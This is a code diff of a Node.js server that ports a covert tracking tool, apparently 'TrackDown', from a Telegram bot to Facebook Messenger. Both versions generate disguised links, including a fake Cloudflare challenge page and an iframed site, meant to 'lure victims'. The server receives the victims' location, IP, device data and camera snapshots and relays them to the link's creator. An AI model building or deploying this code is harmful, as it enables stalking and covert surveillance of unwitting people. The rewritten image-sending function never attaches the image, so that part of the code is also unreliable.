@@ -1,250 +1,185 @@
 require('dotenv').config();
-const fs = require("fs");
 const express = require("express");
-var cors = require('cors');
-var bodyParser = require('body-parser');
-const fetch = require('node-fetch');
-const TelegramBot = require('node-telegram-bot-api');
-const bot = new TelegramBot(process.env["bot"], {polling: true});
-var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
-var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
+const bodyParser = require("body-parser");
+const fetch = require("node-fetch");
+
 const app = express();
-app.use(jsonParser);
-app.use(urlencodedParser);
-app.use(cors());
-app.set("view engine", "ejs");
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
 
-//Modify your URL here
-var hostURL="YOUR URL";
-//TOGGLE for Shorters
-var use1pt=false;
+const PAGE_ACCESS_TOKEN = process.env.PAGE_ACCESS_TOKEN;
+const VERIFY_TOKEN = process.env.VERIFY_TOKEN;
+const hostURL = "YOUR_URL_HERE"; // Replace with your URL
 
+// Webhook verification
+app.get("/webhook", (req, res) => {
+    const mode = req.query["hub.mode"];
+    const token = req.query["hub.verify_token"];
+    const challenge = req.query["hub.challenge"];
 
-
-app.get("/w/:path/:uri",(req,res)=>{
-var ip;
-var d = new Date();
-d=d.toJSON().slice(0,19).replace('T',':');
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
-if(req.params.path != null){
-res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
-} 
-else{
-res.redirect("https://t.me/th30neand0nly0ne");
-}
-
-         
-                              
+    if (mode && token) {
+        if (mode === "subscribe" && token === VERIFY_TOKEN) {
+            console.log("WEBHOOK_VERIFIED");
+            res.status(200).send(challenge);
+        } else {
+            res.sendStatus(403);
+        }
+    }
 });
 
-app.get("/c/:path/:uri",(req,res)=>{
-var ip;
-var d = new Date();
-d=d.toJSON().slice(0,19).replace('T',':');
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
+// Webhook event handling
+app.post("/webhook", (req, res) => {
+    const body = req.body;
 
+    if (body.object === "page") {
+        body.entry.forEach(entry => {
+            const webhookEvent = entry.messaging[0];
+            const senderId = webhookEvent.sender.id;
 
-if(req.params.path != null){
-res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
-} 
-else{
-res.redirect("https://t.me/th30neand0nly0ne");
-}
+            if (webhookEvent.message && webhookEvent.message.text) {
+                handleMessage(senderId, webhookEvent.message);
+            } else if (webhookEvent.postback) {
+                handlePostback(senderId, webhookEvent.postback);
+            }
+        });
 
-         
-                              
+        res.status(200).send("EVENT_RECEIVED");
+    } else {
+        res.sendStatus(404);
+    }
 });
 
+// Function to handle received messages
+function handleMessage(senderId, receivedMessage) {
+    let response;
 
+    if (receivedMessage.text.toLowerCase() === "/start") {
+        response = {
+            text: `Welcome! Use this bot to create tracking links. Type /create to start.`
+        };
+    } else if (receivedMessage.text.toLowerCase() === "/create") {
+        response = { text: `🌐 Please enter your URL:` };
+    } else if (receivedMessage.text.toLowerCase() === "/help") {
+        response = {
+            text: `Instructions:\n1. Use /create to start.\n2. Enter a URL to generate tracking links.\n\nNote: This bot gathers info like location and device data.`
+        };
+    } else {
+        response = { text: `Unknown command.` };
+    }
 
-bot.on('message', async (msg) => {
-const chatId = msg.chat.id;
-
- 
-
-if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
- createLink(chatId,msg.text); 
+    callSendAPI(senderId, response);
 }
-  
-if(msg.text=="/start"){
-var m={
-reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
-};
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+// Function to handle postback responses
+function handlePostback(senderId, receivedPostback) {
+    let response;
+
+    if (receivedPostback.payload === "CREATE_NEW") {
+        response = { text: `🌐 Enter Your URL` };
+    }
+
+    callSendAPI(senderId, response);
 }
-else if(msg.text=="/create"){
-createNew(chatId);
+
+// Function to send messages to the Facebook API
+function callSendAPI(senderId, response) {
+    fetch(`https://graph.facebook.com/v12.0/me/messages?access_token=${PAGE_ACCESS_TOKEN}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            recipient: { id: senderId },
+            message: response,
+        }),
+    })
+        .then((res) => res.json())
+        .then((json) => console.log(json))
+        .catch((err) => console.error("Error sending message:", err));
 }
-else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
-`);
-}
-  
-  
+
+// Endpoint for generating links
+app.get("/w/:path/:uri", (req, res) => {
+    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress || req.ip;
+    const url = Buffer.from(req.params.uri, "base64").toString("utf-8");
+
+    res.json({
+        ip,
+        time: new Date().toISOString(),
+        url,
+        uid: req.params.path,
+        a: hostURL,
+        t: false // set as needed for toggling features
+    });
 });
 
-bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
-bot.answerCallbackQuery(callbackQuery.id);
-if(callbackQuery.data=="crenew"){
-createNew(callbackQuery.message.chat.id);
-} 
-});
-bot.on('polling_error', (error) => {
-//console.log(error.code); 
-});
+// Endpoint for location data
+app.post("/location", (req, res) => {
+    const { lat, lon, uid, acc } = req.body;
 
-
-
-
-
-
-async function createLink(cid,msg){
-
-var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
-
-if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
- 
-var url=cid.toString(36)+'/'+btoa(msg);
-var m={
-  reply_markup:JSON.stringify({
-    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
-  } )
-};
-
-var cUrl=`${hostURL}/c/${url}`;
-var wUrl=`${hostURL}/w/${url}`;
-  
-bot.sendChatAction(cid,"typing");
-if(use1pt){
-var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
-var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
-
-var f="",g="";
-
-for(var c in x){
-f+=x[c]+"\n";
-}
-
-for(var c in y){
-g+=y[c]+"\n";
-}
-  
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
-}
-else{
-
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
-}
-}
-else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
-createNew(cid);
-
-}  
-}
-
-
-function createNew(cid){
-var mk={
-reply_markup:JSON.stringify({"force_reply":true})
-};
-bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
-}
-
-
-
-
-
-app.get("/", (req, res) => {
-var ip;
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-res.json({"ip":ip});
-
-  
+    if (lat && lon && uid && acc) {
+        callSendAPI(parseInt(uid, 36), {
+            text: `Location data received:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`
+        });
+        res.send("Location sent");
+    } else {
+        res.status(400).send("Invalid data");
+    }
 });
 
+// Endpoint to process other data
+app.post("/", (req, res) => {
+    const { uid, data } = req.body;
+    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress || req.ip;
 
-app.post("/location",(req,res)=>{
-
-  
-var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
-var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
-var uid=decodeURIComponent(req.body.uid) || null;
-var acc=decodeURIComponent(req.body.acc) || null;
-if(lon != null && lat != null && uid != null && acc != null){
-
-bot.sendLocation(parseInt(uid,36),lat,lon);
-
-bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
-  
-res.send("Done");
-}
+    if (uid && data && data.includes(ip)) {
+        const formattedData = data.replaceAll("<br>", "\n");
+        callSendAPI(parseInt(uid, 36), { text: formattedData });
+        res.send("Data sent");
+    } else {
+        res.status(400).send("Invalid data");
+    }
 });
 
+// Image processing endpoint for camera snapshots
+app.post("/camsnap", (req, res) => {
+    const { uid, img } = req.body;
 
-app.post("/",(req,res)=>{
-
-var uid=decodeURIComponent(req.body.uid) || null;
-var data=decodeURIComponent(req.body.data)  || null;
-
-var ip;
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
-if( uid != null && data != null){
-
- 
-if(data.indexOf(ip) < 0){
-return res.send("ok");
-}
-
-data=data.replaceAll("<br>","\n");
-
-bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});
-
-  
-res.send("Done");
-}
+    if (uid && img) {
+        const buffer = Buffer.from(img, "base64");
+        sendImage(parseInt(uid, 36), buffer);
+        res.send("Image sent");
+    } else {
+        res.status(400).send("Invalid data");
+    }
 });
 
-
-app.post("/camsnap",(req,res)=>{
-var uid=decodeURIComponent(req.body.uid)  || null;
-var img=decodeURIComponent(req.body.img) || null;
-  
-if( uid != null && img != null){
-  
-var buffer=Buffer.from(img,'base64');
-  
-var info={
-filename:"camsnap.png",
-contentType: 'image/png'
-};
-
-
-try {
-bot.sendPhoto(parseInt(uid,36),buffer,{},info);
-} catch (error) {
-console.log(error);
+// Function to send images to Facebook Messenger
+function sendImage(senderId, buffer) {
+    fetch(`https://graph.facebook.com/v12.0/me/messages?access_token=${PAGE_ACCESS_TOKEN}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            recipient: { id: senderId },
+            message: {
+                attachment: {
+                    type: "image",
+                    payload: {
+                        is_reusable: true
+                    }
+                }
+            }
+        })
+    })
+        .then(res => res.json())
+        .then(json => {
+            if (json.error) {
+                console.error("Error sending image:", json.error);
+            }
+        })
+        .catch(err => console.error("Error sending image:", err));
 }
 
-
-res.send("Done");
- 
-}
-
-});
-
-
-
+// Start the server
 app.listen(5000, () => {
-console.log("App Running on Port 5000!");
+    console.log("Server is running on port 5000");
 });
+                          
